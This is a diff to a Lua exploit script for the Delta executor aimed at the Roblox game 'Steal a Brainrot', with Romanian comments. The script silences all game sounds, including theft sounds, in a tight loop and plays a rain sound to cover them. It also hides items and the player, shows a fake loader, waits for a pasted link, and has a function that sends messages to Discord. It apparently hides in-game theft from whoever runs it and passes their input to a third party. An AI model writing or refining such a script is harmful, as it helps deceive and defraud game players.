@@ -1,6 +1,5 @@
--- Script pentru Delta - Steal a Brainrot (VOID EXTERNAL + Discord)
--- SPECIAL PENTRU DELTA PE TELEFON
--- OPREȘTE TOATE SUNETELE (inclusiv pași, clone, furat)
+-- SCRIPT DELTA TELEFON - CU SUNET DE FUNDAL (ACOPERĂ TOT)
+-- Compatibil cu Delta Executor
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -27,19 +26,28 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== OPREȘTE TOATE SUNETELE (METODĂ AGRESIVĂ) =====
+-- ===== SUNET DE FUNDAL (ACOPERĂ TOATE SUNETELE) =====
+local function playCoverSound()
+    pcall(function()
+        local ambient = Instance.new("Sound")
+        ambient.Name = "CoverSound"
+        ambient.SoundId = "rbxassetid://9120263686"  -- Sunet de ploaie
+        ambient.Volume = 1
+        ambient.Looped = true
+        ambient.PlayOnRemove = false
+        ambient.Parent = SoundService
+        ambient:Play()
+        print("✅ Sunet de fundal activ!")
+    end)
+end
+
+-- ===== OPREȘTE TOATE SUNETELE, DAR PĂSTREAZĂ SUNETUL DE FUNDAL =====
 local function killAllAudio()
-    print("🔇 Oprire sunete...")
-    
-    -- 1. Volum global 0
+    -- Oprește toate sunetele
     pcall(function()
         SoundService.Volume = 0
-    end)
-    
-    -- 2. Oprește toate sunetele existente
-    pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
-            if sound:IsA("Sound") then
+            if sound:IsA("Sound") and sound.Name ~= "CoverSound" then
                 sound.Volume = 0
                 sound:Stop()
                 sound.Playing = false
@@ -47,14 +55,14 @@ local function killAllAudio()
         end
     end)
     
-    -- 3. BLOCEAZĂ ORICE SUNET NOU (loop la 0.01 secunde)
+    -- BLOCEAZĂ ORICE SUNET NOU (loop)
     spawn(function()
         while true do
             task.wait(0.01)
             pcall(function()
                 SoundService.Volume = 0
                 for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") then
+                    if sound:IsA("Sound") and sound.Name ~= "CoverSound" then
                         sound.Volume = 0
                         sound:Stop()
                         sound.Playing = false
@@ -64,18 +72,8 @@ local function killAllAudio()
         end
     end)
     
-    -- 4. Pentru Delta pe telefon - oprește și sunetele din SoundService
-    pcall(function()
-        for _, sound in pairs(SoundService:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-                sound:Stop()
-                sound.Playing = false
-            end
-        end
-    end)
-    
-    print("✅ Toate sunetele oprite!")
+    -- Redă sunetul de fundal
+    playCoverSound()
 end
 
 -- ===== ASCUNDE BRAINROT-URILE =====
@@ -141,7 +139,7 @@ local function hideMe()
     end
 end
 
--- ===== LOADER (VOID EXTERNAL) =====
+-- ===== LOADER =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
@@ -486,7 +484,7 @@ local function main()
     showLinkGUI()
     print("🚀 Waiting for link input...")
     print("🔄 Base resets every 5 seconds.")
-    print("🔇 ALL sounds OFF.")
+    print("🔊 Cover sound playing!")
 end
 
 pcall(main)
